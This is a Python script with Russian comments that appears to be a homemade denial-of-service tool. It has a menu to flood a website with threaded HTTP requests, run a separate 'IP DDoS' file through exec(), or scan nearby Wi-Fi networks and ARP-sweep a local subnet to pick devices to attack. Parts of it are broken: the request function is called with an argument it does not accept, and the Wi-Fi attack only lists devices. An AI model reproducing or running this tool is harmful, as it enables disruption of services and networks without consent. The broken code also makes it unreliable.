import time
import pywifi
import requests
from pywifi import const
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import ARP, Ether, srp, conf
import subprocess

# Вывести список доступных интерфейсов
print(conf.ifaces)

# Убедитесь, что вы выбираете правильный интерфейс
conf.iface = "Intel(R) Wi-Fi 6 AX201 160MHz"  # Замените на имя вашего интерфейса

# Основное меню выбора
print("1 - Site DDoS")
print("2 - IP DDoS")
print("3 - Scan Wi-Fi Networks and DDoS")

chose = input("Выберите тип DDoS или сканирование Wi-Fi: ")

if chose == "1":
    url = input("Введите URL вашего сайта для нагрузочного тестирования: ")
    port = int(input("Введите порт для атаки (например, 80 для HTTP): "))  # Добавлено
    number_of_requests = int(input("Введите количество запросов: "))
if chose == "2":
    exec(open('DDoSAtack/DDOSAtackIP.py', 'r', encoding='utf-8').read())

elif chose == "3":
    number_of_requests = int(input("Введите количество запросов для DDoS атаки на выбранную сеть: "))

# Функция для отправки запроса на URL (если выбран сайт)
def send_request_to_url():
    try:
        response = requests.get(f"{url}:{port}")  # Используем указанный порт
        return response.status_code, response.text
    except requests.exceptions.RequestException as e:
        return None, str(e)

# Функция для сканирования доступных Wi-Fi сетей
def scan_wifi_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Используем первый доступный интерфейс
    iface.scan()  # Запускаем сканирование Wi-Fi сетей
    time.sleep(5)  # Ждем, пока завершится сканирование
    networks = iface.scan_results()

    print("\nДоступные сети:")
    for i, network in enumerate(networks):
        print(f"{i + 1}. SSID: {network.ssid}, Signal: {network.signal}")

    return networks

# Функция для поиска устройств в сети по BSSID
def find_devices_in_network(bssid):
    ip_addresses = []
    # Определяем ARP-запросы для получения устройств в сети
    # Мы берем диапазон IP-адресов, например, 192.168.1.0/24 (замените на ваш диапазон)
    target_ip_range = "192.168.1.0/24"  # Убедитесь, что это ваш диапазон

    arp = ARP(pdst=target_ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, timeout=3, verbose=False)[0]

    for sent, received in result:
        ip_addresses.append(received.psrc)  # Добавляем IP адреса найденных устройств

    return ip_addresses

# Создаем пул потоков для параллельного выполнения запросов
def generate_traffic(num_requests, target_function, target_ip=None):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(target_function, target_ip) for _ in range(num_requests)]
        for future in as_completed(futures):
            status, result = future.result()
            if status:
                print(f'Успешно отправлен запрос с кодом статуса {status}')
            else:
                print(f'Ошибка запроса: {result}')

# Запуск DDoS после выбора Wi-Fi сети
def ddos_wifi_network(network):
    print(f"Начинаем DDoS атаку на сеть {network.ssid} (BSSID: {network.bssid})")
    
    # Находим устройства в сети
    ip_addresses = find_devices_in_network(network.bssid)

    print("Найденные устройства: ")
    
    if not ip_addresses:  # Проверяем, есть ли устройства
        print("Не найдено ни одного устройства в сети.")
        return

    for i, ip in enumerate(ip_addresses):
        print(f"{i + 1}. IP: {ip}")


# Запуск генерации трафика
if __name__ == "__main__":
    if chose == "1":
        generate_traffic(number_of_requests, send_request_to_url)
    elif chose == "3":
        networks = scan_wifi_networks()
        network_choice = int(input("Выберите номер сети для атаки: ")) - 1
        selected_network = networks[network_choice]
        ddos_wifi_network(selected_network)
